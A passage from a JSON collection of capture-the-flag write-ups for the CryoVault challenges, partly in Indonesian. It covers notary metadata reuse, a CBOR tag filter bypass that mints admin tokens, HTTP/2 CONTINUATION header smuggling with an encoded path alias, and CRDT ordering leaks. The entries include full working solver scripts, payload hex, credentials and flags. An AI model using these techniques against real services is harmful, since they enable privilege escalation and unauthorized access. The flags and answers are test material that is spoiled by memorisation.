        "content": "The opening desk expects a legacy referrers index under a digest-derived tag:\n\n`sha256-<live-manifest-digest>`\n\nWe created that index with a descriptor referencing the genuine notary blob produced earlier.\n\nThe important descriptor fields were:\n\n| Field | Value |\n|---|---|\n| `mediaType` | `application/vnd.cryovault.notary.v1+json` |\n| `artifactType` | `application/vnd.cryovault.notary.v1+json` |\n| `digest` | Original retired-case notary digest |\n| `size` | `210` |\n| `org.cryovault.claim` | `unseal` |\n\nOur first attempt omitted `artifactType` and failed with `Invalid referrer descriptor`.\n\nAdding `artifactType` made the registry accept the legacy index with HTTP `201`.\n\nThis was the decisive bypass.\n\nThe descriptor advertised `unseal`, but the actual notary blob still contained:\n\n- Claim: `retired-custody`\n- Subject: the retired manifest\n\nThe notary was genuine. The vulnerability was that its metadata could be reused to satisfy the opening requirements of an unrelated live child.\n\n**No notary signature needed to be forged.**"
      },
      {
        "title": "Final Exploitation",
        "content": "With all objects uploaded, we requested a fresh review ticket for `mixed-retired-first` and supplied it to `/api/open`.\n\nThe server returned:\n\n`case: cv-89d8e1f82759`\n\n`selected: sha256:282d27ce5b7a80683f4c6d17fbe77072ad7f2dc59a88ea8cc8c3a6e487d2ea69`\n\nAnd the flag:\n\n**`isfcr{attest_5d60_notary_41a34ce7_laundered}`**"
      },
      {
        "title": "Root Cause",
        "content": "The application crossed three trust boundaries incorrectly:\n\n1. **Review-to-open integrity:** a review ticket for an index did not ensure that the opening desk operated on the child that passed review.\n2. **Tar path validation:** upload-time path filtering disagreed with tar pathname interpretation during consumption.\n3. **Attestation integrity:** legacy referrer descriptor annotations could satisfy a claim requirement despite the referenced signed notary having a different claim and subject.\n\nThe exploit relied on valid registry objects, legitimate notary material, and inconsistent interpretations of those objects across the custody workflow."
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{attest_5d60_notary_41a34ce7_laundered}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-web-canonicalsin",
    "title": "Canonical Sin",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "**Category:** Web  \n**CTF:** ISFCR  \n**Vulnerability:** CBOR Tagged-Value Validation Mismatch",
    "problemDescription": "The challenge exposes a capability broker with two services: `auth-gw`, responsible for issuing signed tokens, and `vault-api`, which protects the flag behind an admin-only vault entry.\n\nThe guest account receives a CBOR-based Ed25519-signed token containing `role: user` and `caps: [\"read:profile\"]`.\n\nThe objective is to obtain a valid signed token containing `role: admin` and `caps: [\"read:vault\"]`.",
    "tools": [],
    "analysis": "Enumeration identified the endpoint `POST /auth/mint`, which accepts additional claims through the `extra_claims_b64u` field.\n\nA normal CBOR map containing `role: admin` is rejected by a raw-byte filter looking for the string `admin`.\n\nEncoding the value as an indefinite-length CBOR string (`\"ad\"` + `\"min\"`) bypasses that filter, but a second validation step rejects the resulting admin role.\n\nCBOR tag 55799, represented by bytes `d9 d9 f7`, is the *self-described CBOR* tag.\n\nWrapping the indefinite-length `admin` string in this tag produces a value that decodes to `admin`, without including the contiguous ASCII bytes `admin` in the serialized payload.\n\nThe successful extra claims were:\n\n- `role`: tag 55799 wrapping the indefinite-length string `\"ad\"` + `\"min\"`\n- `caps`: `[\"read:vault\"]`\n\n**Payload hex:**\n\n`a264726f6c65d9d9f77f626164636d696eff6463617073816a726561643a7661756c74`\n\nThe gateway accepted this payload and returned HTTP 200. Decoding the newly signed token confirmed `role: admin` and `caps: [\"read:vault\"]`.",
    "solution": [
      {
        "title": "Exploitation",
        "content": "The attack sequence was:\n\n1. Authenticate using `guest / guest123`.\n2. Construct the tagged CBOR extra-claims map.\n3. Base64URL-encode it and send it to `/auth/mint`.\n4. Extract the newly issued signed token.\n5. Use that token to request `/vault/secret/flag`.\n\nThe vault returned HTTP 200 and revealed the flag."
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\nimport base64\nimport json\nimport urllib.request\nimport urllib.error\nimport cbor2\n\nHOST = \"https://isfcrpesu-canonical-sin.chals.io\"\n\n\ndef b64e(data):\n    return base64.urlsafe_b64encode(data).rstrip(b\"=\").decode()\n\n\ndef b64d(data):\n    return base64.urlsafe_b64decode(data + \"=\" * (-len(data) % 4))\n\n\ndef request(path, body=None, token=None):\n    headers = {\"Accept\": \"application/json\"}\n\n    if token:\n        headers[\"Authorization\"] = f\"Bearer {token}\"\n\n    data = None\n    if body is not None:\n        headers[\"Content-Type\"] = \"application/json\"\n        data = json.dumps(body).encode()\n\n    req = urllib.request.Request(\n        HOST + path,\n        data=data,\n        headers=headers,\n        method=\"POST\" if body is not None else \"GET\",\n    )\n\n    try:\n        with urllib.request.urlopen(req, timeout=20) as r:\n            return r.status, r.read().decode(errors=\"replace\")\n    except urllib.error.HTTPError as e:\n        return e.code, e.read().decode(errors=\"replace\")\n\n\n# 1. Login as guest\nstatus, body = request(\"/auth/login\", {\n    \"username\": \"guest\",\n    \"password\": \"guest123\",\n})\n\nassert status == 200, body\nguest_token = json.loads(body)[\"token\"]\n\nprint(\"[+] Guest login successful\")\n\n\n# 2. Build CBOR map:\n# {\n#   \"role\": \"admin\",\n#   \"caps\": [\"read:vault\"]\n# }\n#\n# Encode \"admin\" as an indefinite-length CBOR string:\n# \"ad\" + \"min\"\n#\n# The literal bytes b\"admin\" never appear.\n\npayload = (\n    b\"\\xa2\"\n    + cbor2.dumps(\"role\")\n    + b\"\\x7f\"\n    + cbor2.dumps(\"ad\")\n    + cbor2.dumps(\"min\")\n    + b\"\\xff\"\n    + cbor2.dumps(\"caps\")\n    + cbor2.dumps([\"read:vault\"])\n)\n\nassert b\"admin\" not in payload\n\ndecoded = cbor2.loads(payload)\n\nassert decoded == {\n    \"role\": \"admin\",\n    \"caps\": [\"read:vault\"],\n}\n\nprint(\"[+] CBOR payload:\", payload.hex())\nprint(\"[+] Decoded:\", decoded)\nprint(\"[+] Forbidden raw substring absent\")\n\n\n# 3. Ask auth-gw to mint a signed token\nstatus, body = request(\n    \"/auth/mint\",\n    {\n        \"extra_claims_b64u\": b64e(payload)\n    },\n    guest_token,\n)\n\nprint(\"[+] Mint HTTP:\", status)\n\nif status != 200:\n    print(\"[-] Mint rejected:\", body)\n    raise SystemExit(1)\n\nresult = json.loads(body)\nadmin_token = result[\"token\"]\n\nprint(\"[+] Minted token received\")\n\n\n# 4. Inspect signed claims\nparts = admin_token.split(\".\")\nclaims = cbor2.loads(b64d(parts[1]))\n\nprint(\"[+] Signed claims:\", claims)\n\nif claims.get(\"role\") != \"admin\":\n    print(\"[-] Role is not admin\")\n    raise SystemExit(1)\n\nif \"read:vault\" not in claims.get(\"caps\", []):\n    print(\"[-] Missing read:vault capability\")\n    raise SystemExit(1)\n\n\n# 5. Access protected vault\nstatus, response = request(\n    \"/vault/secret/flag\",\n    token=admin_token,\n)\n\nprint(\"[+] Vault HTTP:\", status)\nprint(\"[+] Vault response:\", response)\n\nif \"isfcr{\" in response:\n    print(\"\\n[FLAG]\", response.strip())"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{c4n0n1c4l_d1ff3r3nt14l_t4g_55799_1s_th3_s3lf_d3scr1b3_tr4p_2ec4}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-web-cassandra",
    "title": "Cassandra",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge Cassandra",
    "problemDescription": "Bug utamanya ada di custom HTTP/2 edge proxy. Filter restricted header hanya berjalan saat HEADERS frame utama didekode. Header dengan nama control-plane yang sama jika diletakkan di CONTINUATION frame tetap diteruskan ke origin.\n\nRangkaian exploit:\n\n1. Bearer monitor ditemukan dari note debugging publik `/api/notes/2`.\n2. `POST /internal/sign` dipakai untuk meminta HMAC atas path alias yang lolos policy signer.\n3. Request ke `/admin/flag` mengirim `X-Signed-Path`, `X-Admin-Ts`, dan `X-Admin-Sig` di CONTINUATION frame.\n4. Origin menormalisasi `/admin/flag`, tetapi memverifikasi signature terhadap nilai raw `X-Signed-Path`.",
    "tools": [],
    "analysis": "`/api/openapi.json` mengungkap route publik dan hint bahwa route internal memerlukan bearer token serta signature HMAC. `/api/changelog` kemudian memberi petunjuk eksplisit tentang bug HPACK/CONTINUATION dan perbedaan raw path versus normalized path.\n\n`GET /admin/flag` tanpa header menghasilkan:\n\n```json\n{\"detail\":\"missing X-Admin-Sig / X-Admin-Ts / X-Signed-Path\"}\n```\n\nMengirim `X-Internal-Token` atau `X-Signed-Path` normal lewat HEADERS ditolak edge dengan `restricted header`.\n\nAda dua parser/trust-boundary flaw:\n\n- Edge memeriksa restricted header pada HEADERS frame pertama, tetapi lupa mengulang pemeriksaan pada CONTINUATION frame.\n- Signer hanya memeriksa path caller secara literal. Path `/api/%2e%2e%2fadmin%2fflag` diawali `/api/` dan tidak memiliki substring literal `/admin`, sehingga boleh ditandatangani. Saat dipakai sebagai nilai signature, path raw itu menjadi alias menuju `/admin/flag` setelah decoding dan normalisasi.\n\nBearer monitor muncul di note debugging publik, misalnya body note 2 memuat `authorization: Bearer dev_bot_bearer_do_not_ship`. Nilai tersebut diverifikasi dengan response `/internal/sign`, bukan ditebak.",
    "solution": [
      {
        "title": "Target dan File",
        "content": "Target: `https://0.cloud.chals.io:30152`\n\nFile lokal: [solve.py](./solve.py) dan [Readme.md](./Readme.md)."
      },
      {
        "title": "Source Code Review",
        "content": "Tidak ada source code atau Dockerfile di direktori challenge; ini blankbox. Analisis dilakukan dari response endpoint dan changelog yang disediakan aplikasi."
      },
      {
        "title": "Eksploitasi",
        "content": "Signer dipanggil dengan body berikut, menggunakan timestamp Unix saat ini:\n\n\n\nSigner mengembalikan `sig` dan `signed_message` untuk path raw tersebut.\n\nRequest admin memakai path route aktual `/admin/flag`, tetapi membawa:\n\n\n\nTiga header terakhir dikodekan HPACK di CONTINUATION frame. Response berhasil:",
        "code": "{\"method\":\"GET\",\"path\":\"/api/%2e%2e%2fadmin%2fflag\",\"ts\":1791663512}"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Signature dibuat ulang setiap eksekusi dengan timestamp saat ini. Jika note debugging berubah atau token dirotasi, set `BEARER` ke token yang terlihat pada response note yang relevan. Header admin wajib tetap berada di CONTINUATION frame; memindahkannya ke HEADERS biasa akan menghasilkan HTTP 400 dari edge."
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\n\"\"\"Solve Cassandra using a deliberately fragmented HTTP/2 header block.\"\"\"\n\nimport json\nimport os\nimport re\nimport socket\nimport ssl\nimport struct\nimport sys\nimport time\nfrom urllib.parse import urlparse\n\nfrom hpack import Decoder, Encoder\n\n\nDEFAULT_TARGET = \"https://0.cloud.chals.io:30152\"\nSIGNED_PATH = \"/api/%2e%2e%2fadmin%2fflag\"\nADMIN_PATH = \"/admin/flag\"\nFLAG_RE = re.compile(r\"[A-Za-z0-9_]+\\{[^{}\\r\\n]+\\}\")\n\n\ndef frame(frame_type, flags, stream_id, payload=b\"\"):\n    return (\n        len(payload).to_bytes(3, \"big\")\n        + bytes((frame_type, flags))\n        + (stream_id & 0x7FFFFFFF).to_bytes(4, \"big\")\n        + payload\n    )\n\n\nclass H2Client:\n    def __init__(self, target):\n        parsed = urlparse(target)\n        if parsed.scheme != \"https\" or not parsed.hostname:\n            raise ValueError(\"TARGET harus berupa URL https://...\")\n        self.host = parsed.hostname\n        self.port = parsed.port or 443\n        self.authority = parsed.netloc\n        self.sock = None\n\n    def connect(self):\n        context = ssl.create_default_context()\n        context.check_hostname = False\n        context.verify_mode = ssl.CERT_NONE\n        context.set_alpn_protocols([\"h2\"])\n        raw = socket.create_connection((self.host, self.port), timeout=10)\n        self.sock = context.wrap_socket(raw, server_hostname=self.host)\n        self.sock.settimeout(10)\n        self.sock.sendall(\n            b\"PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n\" + frame(4, 0, 0)\n        )\n\n        # Consume the peer SETTINGS and acknowledge it before opening stream 1.\n        while True:\n            header = self._read_exact(9)\n            length = int.from_bytes(header[:3], \"big\")\n            frame_type, flags = header[3], header[4]\n            self._read_exact(length)\n            if frame_type == 4:\n                if not (flags & 1):\n                    self.sock.sendall(frame(4, 1, 0))\n                break\n\n    def close(self):\n        if self.sock is not None:\n            try:\n                self.sock.close()\n            finally:\n                self.sock = None\n\n    def _read_exact(self, length):\n        result = b\"\"\n        while len(result) < length:\n            chunk = self.sock.recv(length - len(result))\n            if not chunk:\n                raise RuntimeError(\"koneksi HTTP/2 ditutup sebelum response lengkap\")\n            result += chunk\n        return result\n\n    def request(self, method, path, headers=(), body=b\"\", continuation_headers=()):\n        self.connect()\n        try:\n            encoder = Encoder()\n            decoder = Decoder()\n            base = [\n                (\":method\", method),\n                (\":scheme\", \"https\"),\n                (\":authority\", self.authority),\n                (\":path\", path),\n            ]\n            base.extend(headers)\n\n            if continuation_headers:\n                # The edge checks restricted names in HEADERS but forgets to\n                # repeat that check when it decodes CONTINUATION frames.\n                first_block = encoder.encode(base)\n                second_block = encoder.encode(list(continuation_headers))\n                flags = 1 if not body else 0  # END_STREAM when there is no DATA.\n                self.sock.sendall(\n                    frame(1, flags, 1, first_block)\n                    + frame(9, 4, 1, second_block)\n                )\n            else:\n                block = encoder.encode(base + list(continuation_headers))\n                flags = 5 if not body else 4  # END_HEADERS plus optional END_STREAM.\n                self.sock.sendall(frame(1, flags, 1, block))\n\n            if body:\n                self.sock.sendall(frame(0, 1, 1, body))\n\n            response_headers = []\n            response_body = bytearray()\n            while True:\n                header = self._read_exact(9)\n                length = int.from_bytes(header[:3], \"big\")\n                frame_type, flags = header[3], header[4]\n                payload = self._read_exact(length)\n\n                if frame_type == 1:\n                    header_block = payload\n                    while not (flags & 4):\n                        continuation = self._read_exact(9)\n                        continuation_length = int.from_bytes(continuation[:3], \"big\")\n                        continuation_type, flags = continuation[3], continuation[4]\n                        if continuation_type != 9:\n                            raise RuntimeError(\"response HEADERS tidak diikuti CONTINUATION\")\n                        header_block += self._read_exact(continuation_length)\n                    response_headers = decoder.decode(header_block)\n                elif frame_type == 0:\n                    response_body.extend(payload)\n                elif frame_type == 7:\n                    raise RuntimeError(\"server mengirim GOAWAY\")\n\n                if frame_type in (0, 1) and (flags & 1):\n                    break\n\n            status = int(dict(response_headers).get(\":status\", \"0\"))\n            return status, dict(response_headers), bytes(response_body)\n        finally:\n            self.close()\n\n\ndef target_from_args():\n    return (sys.argv[1] if len(sys.argv) > 1 else os.environ.get(\"TARGET\", DEFAULT_TARGET)).rstrip(\"/\")\n\n\ndef discover_bearer(client):\n    supplied = os.environ.get(\"BEARER\")\n    if supplied:\n        return supplied\n\n    # The public bulletin board contains the monitor's captured request. This\n    # is an in-scope challenge artifact and avoids guessing a rotating token.\n    status, _, body = client.request(\"GET\", \"/api/notes/2\", headers=((\"accept\", \"*/*\"),))\n    if status != 200:\n        raise RuntimeError(f\"gagal membaca note debugging (HTTP {status})\")\n    match = re.search(rb\"authorization:\\s*Bearer\\s+([^\\\\\\r\\n\\\"]+)\", body, re.I)\n    if not match:\n        raise RuntimeError(\"bearer token tidak ditemukan di /api/notes/2; set BEARER=...\")\n    return match.group(1).decode()\n\n\ndef main():\n    client = H2Client(target_from_args())\n    bearer = discover_bearer(client)\n    print(\"[+] bearer ditemukan dari note debugging\")\n\n    timestamp = int(time.time())\n    signer_body = json.dumps(\n        {\"method\": \"GET\", \"path\": SIGNED_PATH, \"ts\": timestamp},\n        separators=(\",\", \":\"),\n    ).encode()\n    status, _, body = client.request(\n        \"POST\",\n        \"/internal/sign\",\n        headers=(\n            (\"authorization\", f\"Bearer {bearer}\"),\n            (\"content-type\", \"application/json\"),\n        ),\n        body=signer_body,\n    )\n    if status != 200:\n        raise RuntimeError(f\"signer gagal (HTTP {status}): {body.decode(errors='replace')}\")\n    try:\n        signature = json.loads(body)[\"sig\"]\n    except (ValueError, KeyError) as exc:\n        raise RuntimeError(\"response signer tidak memuat sig\") from exc\n    print(\"[+] signature diperoleh untuk path alias encoded\")\n\n    status, _, body = client.request(\n        \"GET\",\n        ADMIN_PATH,\n        headers=(\n            (\"user-agent\", \"cassandra-solve\"),\n            (\"accept\", \"*/*\"),\n            (\"authorization\", f\"Bearer {bearer}\"),\n        ),\n        continuation_headers=(\n            (\"x-signed-path\", SIGNED_PATH),\n            (\"x-admin-ts\", str(timestamp)),\n            (\"x-admin-sig\", signature),\n        ),\n    )\n    text = body.decode(errors=\"replace\")\n    if status != 200:\n        raise RuntimeError(f\"admin gagal (HTTP {status}): {text}\")\n    match = FLAG_RE.search(text)\n    if not match:\n        raise RuntimeError(f\"response admin tidak memuat flag: {text}\")\n    print(\"[+] flag diperoleh dari response /admin/flag\")\n    print(f\"<FLAG>{match.group(0)}</FLAG>\")\n\n\nif __name__ == \"__main__\":\n    try:\n        main()\n    except Exception as exc:\n        print(f\"[-] {exc}\", file=sys.stderr)\n        sys.exit(1)"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{h2_continuation_smuggling_is_the_new_black}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-web-draftpad",
    "title": "Draftpad",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge Draftpad",
    "problemDescription": "Bug ada di mekanisme export public. Private range disimpan sebagai pin berbasis posisi, tetapi operasi insert CRDT bisa menggeser urutan block tanpa memindahkan batas private secara aman. Block baru dengan clock maksimum masuk di index 0 dan membuat export public melewati bagian confidential.",
    "tools": [],
    "analysis": "`GET /` mengungkap frontend dan endpoint berikut:\n\n- `GET /api/document` — melihat block dan pin.\n- `GET /api/pins` — melihat posisi pin private.\n- `GET /api/export/public` — mengambil export yang seharusnya hanya berisi bagian public.\n- `POST /api/ops` — menambah atau menghapus block.\n\nResponse awal `/api/document` menunjukkan pin `private_start` dan `private_end`, sedangkan `/api/export/public` adalah plain text.\n\nPin private tidak terikat kuat pada isi confidential setelah urutan block berubah. Insert root dengan clock maksimum diterima sebagai block pertama, tetapi boundary private tidak ikut menjaga block confidential. Akibatnya `/api/export/public` mengikutsertakan teks yang seharusnya disembunyikan.",
    "solution": [
      {
        "title": "Target dan File",
        "content": "- Target: `https://isfcrpesu-draftpad.chals.io`\n- Direktori challenge tidak berisi source code atau Dockerfile, jadi analisis dilakukan terhadap service remote yang diberikan.\n- Script eksploitasi: [solve.py](./solve.py)"
      },
      {
        "title": "Source Code Review",
        "content": "Source backend tidak tersedia. Dari `app.js`, form insert mengirim object JSON ke `POST /api/ops` dengan field `id`, `parent_id`, `clock`, `author`, dan `content`. Frontend menerima clock sampai `1000000`, sehingga field ini bisa diuji sebagai pengendali urutan merge."
      },
      {
        "title": "Eksploitasi",
        "content": "Request yang dipakai:\n\n\n\nResponse:\n\n\n\nSesudah itu, `GET /api/export/public` mengembalikan bagian berikut:",
        "code": "POST /api/ops HTTP/1.1\nContent-Type: application/json\n\n{\"type\":\"insert\",\"id\":\"shift-proof-UNIQUE\",\"parent_id\":null,\"clock\":1000000,\"author\":\"guest\",\"content\":\"proof\"}"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Exploit tidak membutuhkan brute force atau endpoint di luar scope. ID block dibuat acak agar bisa dijalankan ulang. Nilai clock `1000000` adalah batas maksimum yang diterima form dan pada pengujian menghasilkan `expected_index=0`."
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\n\nimport os\nimport re\nimport secrets\nimport sys\n\nimport requests\n\n\nDEFAULT_TARGET = \"https://isfcrpesu-draftpad.chals.io\"\nFLAG_RE = re.compile(r\"(?:isfcr|CTF|FLAG)\\{[^}\\r\\n]+\\}\")\n\n\ndef main() -> None:\n    target = (sys.argv[1] if len(sys.argv) > 1 else os.environ.get(\"TARGET\", DEFAULT_TARGET)).rstrip(\"/\")\n    session = requests.Session()\n    block_id = f\"shift-proof-{secrets.token_hex(6)}\"\n\n    operation = {\n        \"type\": \"insert\",\n        \"id\": block_id,\n        \"parent_id\": None,\n        \"clock\": 1_000_000,\n        \"author\": \"guest\",\n        \"content\": \"proof\",\n    }\n\n    try:\n        inserted = session.post(f\"{target}/api/ops\", json=operation, timeout=12)\n        inserted.raise_for_status()\n        result = inserted.json()\n    except (requests.RequestException, ValueError) as exc:\n        raise SystemExit(f\"insert gagal: {exc}\") from exc\n\n    if not result.get(\"ok\"):\n        raise SystemExit(f\"insert ditolak: {result}\")\n    print(f\"[+] inserted {block_id}; expected_index={result.get('expected_index')}\")\n\n    try:\n        exported = session.get(f\"{target}/api/export/public\", timeout=12)\n        exported.raise_for_status()\n    except requests.RequestException as exc:\n        raise SystemExit(f\"export gagal: {exc}\") from exc\n\n    match = FLAG_RE.search(exported.text)\n    if not match:\n        raise SystemExit(\"flag tidak ditemukan di /api/export/public\")\n\n    print(f\"<FLAG>{match.group(0)}</FLAG>\")\n\n\nif __name__ == \"__main__\":\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{merge_shifts_the_wall_not_the_window}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-web-greyline-junction",
    "title": "greyline-junction",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge greyline-junction",
    "problemDescription": "Flag didapat dengan membuat dua authority yang path-nya bertabrakan setelah control revision berubah dari A ke B. Aplikasi melepas reservation saat cancel, tetapi kartu authority yang dibatalkan masih diterima oleh endpoint dispatch.",
    "tools": [],
    "analysis": "State dikirim sebagai token tersegel di setiap request. Papan route berbeda pada revision A dan B, dan relabel route berubah untuk setiap desk session. Karena itu route ID tidak boleh di-hardcode; solver membaca kedua scheme dari sesi yang sama.\n\nRoute normal tidak bisa direncanakan bersamaan karena semua authority menahan `AP-0`. Cancel authority pertama melepas `AP-0`, lalu authority kedua dapat dibuat.\n\n`POST /api/cancel` memiliki validasi status yang tidak konsisten dengan `POST /api/dispatch`.\n\nCancel melepas holding authority pertama sehingga authority kedua bisa direncanakan. Setelah changeover, dispatch tetap menerima ID authority pertama. State akhir berisi dua movement walaupun keduanya sebelumnya tidak bisa memegang approach lock bersamaan.",
    "solution": [
      {
        "title": "Target dan File",
        "content": "- Target: `https://isfcrpesu-greyline-junction.chals.io`\n- Artefak lokal: `FIELD_GUILD.md`\n- Endpoint yang dipakai: `/api/reset`, `/api/scheme`, `/api/plan`, `/api/cancel`, `/api/changeover`, `/api/dispatch`, dan `/api/incident`"
      },
      {
        "title": "Source Code Review",
        "content": "Source server tidak disediakan. JavaScript publik menunjukkan semua endpoint dan bahwa frontend menonaktifkan planning sesudah changeover. Pengujian API menunjukkan respons cancel berisi daftar circuit yang dilepas, sedangkan kartu authority yang lama masih dapat dipakai pada dispatch sesudah ada kartu baru."
      },
      {
        "title": "Eksploitasi",
        "content": "1. Reset desk dan baca scheme revision A.\n2. Lakukan changeover dari token awal hanya untuk membaca scheme B, lalu pilih dua route yang holding-nya terpisah pada A dan path-nya beririsan pada B.\n3. Dari token awal, plan train `A12` pada route pertama.\n4. Cancel authority `A12` untuk melepas `AP-0`.\n5. Plan train `B12` pada route kedua.\n6. Changeover ke revision B.\n7. Dispatch authority `A12` yang telah dibatalkan, lalu dispatch authority `B12` dari state hasil dispatch pertama.\n8. Kirim state terakhir ke `/api/incident`.\n\nContoh respons incident yang membuktikan bug:",
        "code": "{\n  \"circuit\": \"TC-18\",\n  \"flag\": \"isfcr{greyline_a471_stale_1818abfe_card}\",\n  \"status\": \"contradiction\",\n  \"trains\": [\"A12\", \"B12\"]\n}"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Solver memakai satu session token, tidak melakukan scan, dan hanya menjalankan endpoint API yang didokumentasikan oleh operator card. Selama pasangan route A-disjoint/B-overlap tersedia seperti desain challenge, output incident konsisten menghasilkan flag."
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\n\"\"\"Solve Greyline Junction's stale-cancel authority bug.\"\"\"\n\nimport os\nimport re\nimport sys\n\nimport requests\n\n\nTARGET = os.environ.get(\n    \"TARGET\", \"https://isfcrpesu-greyline-junction.chals.io\"\n).rstrip(\"/\")\nFLAG_RE = re.compile(r\"isfcr\\{[^}\\r\\n]+\\}\")\n\n\ndef post(session, path, payload):\n    response = session.post(f\"{TARGET}{path}\", json=payload, timeout=15)\n    try:\n        data = response.json()\n    except ValueError:\n        raise RuntimeError(f\"{path}: non-JSON response ({response.status_code})\")\n    if not response.ok:\n        raise RuntimeError(f\"{path}: {data}\")\n    return data\n\n\ndef find_conflicting_pairs(scheme_a, scheme_b):\n    \"\"\"Find A-disjoint route pairs whose revision-B paths overlap.\"\"\"\n    routes_b = {route[\"id\"]: route for route in scheme_b[\"routes\"]}\n    routes_a = scheme_a[\"routes\"]\n    pairs = []\n\n    for index, first in enumerate(routes_a):\n        first_hold = set(first[\"path\"]) | {first[\"flank\"]}\n        for second in routes_a[index + 1 :]:\n            second_hold = set(second[\"path\"]) | {second[\"flank\"]}\n            if first_hold & second_hold:\n                continue\n            overlap = set(routes_b[first[\"id\"]][\"path\"]) & set(\n                routes_b[second[\"id\"]][\"path\"]\n            )\n            if overlap:\n                pairs.append((first, second, sorted(overlap)))\n    return pairs\n\n\ndef main():\n    session = requests.Session()\n\n    # Relabeling also changes which stale-card pair reaches dispatch. Retry fresh desks.\n    for desk_number in range(1, 31):\n        base_state = post(session, \"/api/reset\", {})[\"state\"]\n        scheme_a = post(session, \"/api/scheme\", {\"state\": base_state})\n        preview_b_state = post(session, \"/api/changeover\", {\"state\": base_state})[\"state\"]\n        scheme_b = post(session, \"/api/scheme\", {\"state\": preview_b_state})\n\n        for first, second, overlap in find_conflicting_pairs(scheme_a, scheme_b):\n            authority_a = post(\n                session,\n                \"/api/plan\",\n                {\"state\": base_state, \"train\": \"A12\", \"route\": first[\"id\"]},\n            )\n            cancelled = post(\n                session,\n                \"/api/cancel\",\n                {\"state\": authority_a[\"state\"], \"authority\": authority_a[\"authority\"]},\n            )\n            authority_b = post(\n                session,\n                \"/api/plan\",\n                {\"state\": cancelled[\"state\"], \"train\": \"B12\", \"route\": second[\"id\"]},\n            )\n            changed = post(session, \"/api/changeover\", {\"state\": authority_b[\"state\"]})\n            first_dispatch = session.post(\n                f\"{TARGET}/api/dispatch\",\n                json={\"state\": changed[\"state\"], \"authority\": authority_a[\"authority\"]},\n                timeout=15,\n            )\n            if not first_dispatch.ok:\n                continue\n            moved_a = first_dispatch.json()\n            moved_b = post(\n                session,\n                \"/api/dispatch\",\n                {\"state\": moved_a[\"state\"], \"authority\": authority_b[\"authority\"]},\n            )\n            incident = post(session, \"/api/incident\", {\"state\": moved_b[\"state\"]})\n            match = FLAG_RE.search(str(incident))\n            if match:\n                print(\n                    f\"[*] Desk {desk_number}: {first['id']} -> {second['id']}; \"\n                    f\"B collision: {', '.join(overlap)}\"\n                )\n                print(match.group(0))\n                return\n    raise RuntimeError(\"No dispatchable stale authority was found in 30 fresh desks\")\n\n\nif __name__ == \"__main__\":\n    try:\n        main()\n    except (requests.RequestException, RuntimeError) as error:\n        print(f\"[!] {error}\", file=sys.stderr)\n        sys.exit(1)"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{greyline_a471_stale_1818abfe_card}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-web-near-miss",
    "title": "near-miss",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge near-miss",
    "problemDescription": "Bug ada di `POST /hunks/check`. Endpoint ini tidak melakukan perbandingan hunk\nsecara exact; teks `find` yang cukup mirip dengan master tetap dianggap berlaku.\nDengan padding yang pasti salah, satu karakter seal bisa dijadikan pembeda.",
    "tools": [],
    "analysis": "`POST /session` membuat session baru. `GET /runbook` mengembalikan copy runbook\ndengan baris seperti:\n\n```text\nkeeper seal: ###### · cut HH:MM:00Z\n```\n\nSeal asli terdiri dari enam simbol dari alphabet 32 karakter. `POST /unseal`\nmengembalikan flag jika seal yang sedang berlaku benar.\n\n`/hunks/check` menerima hunk dengan `near`, `find`, dan `put`, lalu menjawab\n`applies`. Pengujian black-box menunjukkan dua sifat yang bisa dieksploitasi:\n\n1. `near` dapat menunjuk ke offset master yang berbeda dari offset pada copy.\n2. Matcher menerima near-miss berbasis kemiripan byte, bukan hanya string exact.\n\nOffset master dicari memakai 32 byte publik setelah seal redacted, yaitu bagian\n` · cut ...` dan awal kalimat berikutnya. Suffix itu dikirim sebagai 32 kandidat\noffset dalam satu batch.",
    "solution": [
      {
        "title": "Target dan File",
        "content": "Target:\n\n\n\nFile lokal yang tersedia adalah `README.md` sebagai spesifikasi service dan\n`client.py` sebagai wrapper HTTP. Source server atau Dockerfile tidak diberikan.",
        "code": "https://isfcrpesu-near-miss.chals.io"
      },
      {
        "title": "Source Code Review",
        "content": "Tidak ada source code server di bundle. Dari `client.py` dan spesifikasi,\nendpoint pentingnya adalah `/session`, `/runbook`, `/hunks/check`, dan `/unseal`."
      },
      {
        "title": "Eksploitasi",
